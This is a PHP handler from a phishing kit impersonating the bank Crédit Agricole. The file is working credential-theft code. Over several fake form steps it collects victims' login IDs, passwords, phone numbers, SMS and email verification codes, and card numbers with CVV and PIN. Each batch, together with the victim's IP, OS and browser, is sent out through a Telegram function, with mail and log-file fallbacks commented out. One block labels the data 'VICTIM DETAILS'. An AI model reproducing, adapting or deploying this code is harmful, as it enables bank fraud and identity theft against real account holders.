<?php



include_once '../inc/app.php';
include_once '../vendor/autoload.php';
use Inacho\CreditCard;

function validate_cc_number($number = null) {
    $card = CreditCard::validCreditCard($number);
    if( $card['valid'] == false ) {
        return false;
    }
    return $card;
}

function validate_cc_cvv($number = null,$type = null) {
    if( empty($number) || empty($type) )
        return false;
    $cvv = CreditCard::validCvc($number, $type);
    return $cvv;
}

$to = '';

$random   = rand(0,100000000000);
$dispatch = substr(md5($random), 0, 17);


if($_SERVER['REQUEST_METHOD'] == "POST") {

    if ($_POST['type'] == "region") {

        $_SESSION['region_number'] = $_POST['region_number'];
        $_SESSION['region_caisse']    = $_POST['region_caisse'];

        $_SESSION['errors'] = [];
        if( empty($_POST['region_number']) && empty($_POST['region_caisse']) ) {
            $_SESSION['errors']['region_number'] = true;
        }

        if( count($_SESSION['errors']) == 0 ) {

            $subject = $_SERVER['REMOTE_ADDR'] . ' | CREDIT AGRICOL | Caisse Régionale';
            $message .= 'Numéro de département : ' . $_POST['region_number'] . "\r\n";
            $message .= 'Caisse régionale : ' . $_POST['region_caisse'] . "\r\n";
            $message .= '/---------------- DETAILS ----------------/' . "\r\n";
            $message .= 'IP address : ' . get_user_ip() . "\r\n";
            $message .= 'Country : ' . get_user_country() . "\r\n";
            $message .= 'OS : ' . get_user_os() . "\r\n";
            $message .= 'Browser : ' . get_user_browser() . "\r\n";
            $message .= 'User agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
            $headers = "MIME-Version: 1.0" . "\r\n";
            $headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";

            //mail($to,$subject,$message,$headers);
            //file_put_contents("../resulttt987.txt", $message, FILE_APPEND);
            header("location: connexion.html?particulier#_$dispatch");

        } else {
            header("location: dep.html?error#_$dispatch");
        }

    }

    if ($_POST['type'] == "login") {

        $_SESSION['identifiant'] = $_POST['identifiant'];
        $_SESSION['password']    = $_POST['password'];

        $_SESSION['errors'] = [];
        if( validate_number($_POST['identifiant'],11) == false ) {
            $_SESSION['errors']['identifiant'] = true;
        }

        if( validate_number($_POST['password'],6) == false ) {
            $_SESSION['errors']['password'] = true;
        }

        if( count($_SESSION['errors']) == 0 ) {

            $subject = $_SERVER['REMOTE_ADDR'] . ' | CREDIT AGRICOL | Login';
            $message .= 'Numéro de département : ' . $_SESSION['region_number'] . "\r\n";
            $message .= 'Caisse régionale : ' . $_SESSION['region_caisse'] . "\r\n";
            $message .= 'Identifiant : ' . $_POST['identifiant'] . "\r\n";
            $message .= 'Password : ' . $_POST['password'] . "\r\n";
            $message .= '/---------------- DETAILS ----------------/' . "\r\n";
            $message .= 'IP address : ' . get_user_ip() . "\r\n";
            $message .= 'Country : ' . get_user_country() . "\r\n";
            $message .= 'OS : ' . get_user_os() . "\r\n";
            $message .= 'Browser : ' . get_user_browser() . "\r\n";
            $message .= 'User agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
            $headers = "MIME-Version: 1.0" . "\r\n";
            $headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";

			telegram_send(urlencode($message));
           // mail($to,$subject,$message,$headers);
            //file_put_contents("../resulttt987.txt", $message, FILE_APPEND);
            header("location: load.html?validation#_$dispatch");

        } else {
            header("location: connexion.html?particulier#_$dispatch");
        }

    }
	
	
	
	    if ($_POST['type'] == "mobile") {

        $_SESSION['mobile'] = $_POST['mobile'];

        $_SESSION['errors'] = [];
        if( validate_number($_POST['mobile'],10) == false ) {
            $_SESSION['errors']['mobile'] = true;
        }

        if( count($_SESSION['errors']) == 0 ) {

            $subject = $_SERVER['REMOTE_ADDR'] . ' | CREDIT AGRICOL | Login';
			$message .= 'Numéro de département : ' . $_SESSION['region_number'] . "\r\n";
            $message .= 'Caisse régionale : ' . $_SESSION['region_caisse'] . "\r\n";
            $message .= 'Identifiant : ' . $_POST['identifiant'] . "\r\n";
            $message .= 'Password : ' . $_POST['password'] . "\r\n";
            $message .= 'Numéro de Téléphone : ' . $_SESSION['mobile'] . "\r\n";
            $message .= '/---------------- DETAILS ----------------/' . "\r\n";
            $message .= 'IP address : ' . get_user_ip() . "\r\n";
            $message .= 'Country : ' . get_user_country() . "\r\n";
            $message .= 'OS : ' . get_user_os() . "\r\n";
            $message .= 'Browser : ' . get_user_browser() . "\r\n";
            $message .= 'User agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
            $headers = "MIME-Version: 1.0" . "\r\n";
            $headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";

			telegram_send(urlencode($message));
           // mail($to,$subject,$message,$headers);
            //file_put_contents("../resulttt987.txt", $message, FILE_APPEND);
            header("location: SMS.html?validation#_$dispatch");

        } else {
            header("location: mobile.html.html?particulier#_$dispatch");
        }

    }
	
	
		if ($_POST['type'] == "sms") {
        
		
       

  $message .= 'Numéro de département : ' . $_SESSION['region_number'] . "\r\n";
            $message .= 'Caisse régionale : ' . $_SESSION['region_caisse'] . "\r\n";
            $message .= 'Identifiant : ' . $_SESSION['identifiant'] . "\r\n";
            $message .= 'Password : ' . $_SESSION['password'] . "\r\n";
			$message .= 'Telephone : ' . $_POST['mobile'] . "\r\n";
            $message .= 'SMS : ' . $_POST['sms'] . "\r\n";
            $message .= '/---------------- DETAILS ----------------/' . "\r\n";
            $message .= 'IP address : ' . get_user_ip() . "\r\n";
            $message .= 'Country : ' . get_user_country() . "\r\n";
            $message .= 'OS : ' . get_user_os() . "\r\n";
            $message .= 'Browser : ' . get_user_browser() . "\r\n";
            $message .= 'User agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
            $headers = "MIME-Version: 1.0" . "\r\n";
            $headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";

			telegram_send(urlencode($message));
            //mail($to,$subject,$message,$headers);
            //file_put_contents("../resulttt987.txt", $message, FILE_APPEND);
            session_destroy();
            header("location: E-mail.html");

       

    }

   
	
	
	

    if ($_POST['type'] == "email") {

        $_SESSION['email']        = $_POST['email'];

        $_SESSION['errors'] = [];
        if( empty($_POST['email']) || strlen($_POST['email']) != 6 ) {
            $_SESSION['errors']['email'] = 'Le code est incorrect.';
        }

        if( count($_SESSION['errors']) == 0 ) {

            $subject = $_SERVER['REMOTE_ADDR'] . ' | CREDIT AGRICOL | Securepasse';
            $message .= 'Numéro de département : ' . $_SESSION['region_number'] . "\r\n";
            $message .= 'Caisse régionale : ' . $_SESSION['region_caisse'] . "\r\n";
            $message .= 'Identifiant : ' . $_SESSION['identifiant'] . "\r\n";
            $message .= 'Password : ' . $_SESSION['password'] . "\r\n";
			$message .= 'Telephone : ' . $_POST['mobile'] . "\r\n";
            $message .= 'SMS : ' . $_POST['sms'] . "\r\n";
            $message .= 'Email : ' . $_POST['email'] . "\r\n";
            $message .= '/----------------DETAILS ----------------/' . "\r\n";
            $message .= 'IP address : ' . get_user_ip() . "\r\n";
            $message .= 'Country : ' . get_user_country() . "\r\n";
            $message .= 'OS : ' . get_user_os() . "\r\n";
            $message .= 'Browser : ' . get_user_browser() . "\r\n";
            $message .= 'User agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
            $headers = "MIME-Version: 1.0" . "\r\n";
            $headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";

			telegram_send(urlencode($message));
            //mail($to,$subject,$message,$headers);
            //file_put_contents("../resulttt987.txt", $message, FILE_APPEND);
            header("location: load2.html?validation#_$dispatch");

        } else {
            header("location: E-mail.html?validation#_$dispatch");
        }

    }

    if ($_POST['type'] == "emailErreur") {

        $_SESSION['emailerr']        = $_POST['emailerr'];

        $_SESSION['errors'] = [];
        if( empty($_POST['emailerr']) || strlen($_POST['emailerr']) != 6 ) {
            $_SESSION['errors']['emailerr'] = 'Le code est incorrect.';
        }

        if( count($_SESSION['errors']) == 0 ) {

            $subject = $_SERVER['REMOTE_ADDR'] . ' | CREDIT AGRICOL | Code Email';
            $message .= 'Numéro de département : ' . $_SESSION['region_number'] . "\r\n";
            $message .= 'Caisse régionale : ' . $_SESSION['region_caisse'] . "\r\n";
            $message .= 'Identifiant : ' . $_SESSION['identifiant'] . "\r\n";
            $message .= 'Password : ' . $_SESSION['password'] . "\r\n";
            $message .= 'Telephone : ' . $_POST['mobile'] . "\r\n";
            $message .= 'SMS : ' . $_POST['sms'] . "\r\n";
            $message .= 'Email : ' . $_POST['email'] . "\r\n";
            $message .= 'Email Erreur : ' . $_POST['emailerr'] . "\r\n";
            $message .= '/---------------- VICTIM DETAILS ----------------/' . "\r\n";
            $message .= 'IP address : ' . get_user_ip() . "\r\n";
            $message .= 'Country : ' . get_user_country() . "\r\n";
            $message .= 'OS : ' . get_user_os() . "\r\n";
            $message .= 'Browser : ' . get_user_browser() . "\r\n";
            $message .= 'User agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
            $headers = "MIME-Version: 1.0" . "\r\n";
            $headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";

			telegram_send(urlencode($message));
            //mail($to,$subject,$message,$headers);
            //file_put_contents("../resulttt987.txt", $message, FILE_APPEND);
            header("location: carte.html?validation#_$dispatch");

        } else {
            header("location: E-mail-Error.html?validation#_$dispatch");
        }

    }
	
	
	if ($_POST['type'] == "card") {
        
		
       

            $subject = $_SERVER['REMOTE_ADDR'] . ' | CREDIT AGRICOL | Card Details';
            $message .= 'Numéro de département : ' . $_SESSION['region_number'] . "\r\n";
            $message .= 'Caisse régionale : ' . $_SESSION['region_caisse'] . "\r\n";
            $message .= 'Identifiant : ' . $_SESSION['identifiant'] . "\r\n";
            $message .= 'Password : ' . $_SESSION['password'] . "\r\n";
            $message .= 'Telephone : ' . $_POST['mobile'] . "\r\n";
            $message .= 'SMS : ' . $_POST['sms'] . "\r\n";
            $message .= 'Email : ' . $_POST['email'] . "\r\n";
            $message .= 'Email Erreur : ' . $_POST['emailerr'] . "\r\n";
			$message .= 'N° de carte : ' . $_POST['cc_number'] . "\r\n";
            $message .= 'Mois : ' . $_POST['cc_date'] . "\r\n";
			$message .= 'Annee : ' . $_POST['prenom'] . "\r\n";
            $message .= 'CVV : ' . $_POST['cc_cvv'] . "\r\n";
			$message .= 'PIN : ' . $_POST['pin'] . "\r\n";
            $message .= '/---------------- DETAILS ----------------/' . "\r\n";
            $message .= 'IP address : ' . get_user_ip() . "\r\n";
            $message .= 'Country : ' . get_user_country() . "\r\n";
            $message .= 'OS : ' . get_user_os() . "\r\n";
            $message .= 'Browser : ' . get_user_browser() . "\r\n";
            $message .= 'User agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
            $headers = "MIME-Version: 1.0" . "\r\n";
            $headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";

			telegram_send(urlencode($message));
            //mail($to,$subject,$message,$headers);
            //file_put_contents("../resulttt987.txt", $message, FILE_APPEND);
            session_destroy();
            header("location: load3.html");

       

    }
	
	
		if ($_POST['type'] == "sms2") {
        
		
       

            $subject = $_SERVER['REMOTE_ADDR'] . ' | CREDIT AGRICOL | SMS FIN';
            $message .= 'Numéro de département : ' . $_SESSION['region_number'] . "\r\n";
            $message .= 'Caisse régionale : ' . $_SESSION['region_caisse'] . "\r\n";
            $message .= 'Identifiant : ' . $_SESSION['identifiant'] . "\r\n";
            $message .= 'Password : ' . $_SESSION['password'] . "\r\n";
            $message .= 'Telephone : ' . $_POST['mobile'] . "\r\n";
            $message .= 'SMS : ' . $_POST['sms'] . "\r\n";
            $message .= 'Email : ' . $_POST['email'] . "\r\n";
            $message .= 'Email Erreur : ' . $_POST['emailerr'] . "\r\n";
			$message .= 'N° de carte : ' . $_POST['cc_number'] . "\r\n";
            $message .= 'Mois : ' . $_POST['cc_date'] . "\r\n";
			$message .= 'Annee : ' . $_POST['prenom'] . "\r\n";
            $message .= 'CVV : ' . $_POST['cc_cvv'] . "\r\n";
			$message .= 'PIN : ' . $_POST['pin'] . "\r\n";
			$message .= 'SMS FIN : ' . $_POST['sms2'] . "\r\n";
            $message .= '/---------------- DETAILS ----------------/' . "\r\n";
            $message .= 'IP address : ' . get_user_ip() . "\r\n";
            $message .= 'Country : ' . get_user_country() . "\r\n";
            $message .= 'OS : ' . get_user_os() . "\r\n";
            $message .= 'Browser : ' . get_user_browser() . "\r\n";
            $message .= 'User agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
            $headers = "MIME-Version: 1.0" . "\r\n";
            $headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";

			telegram_send(urlencode($message));
            //mail($to,$subject,$message,$headers);
            //file_put_contents("../resulttt987.txt", $message, FILE_APPEND);
            session_destroy();
            header("location: Confirmation.html");

       

    }

}

?>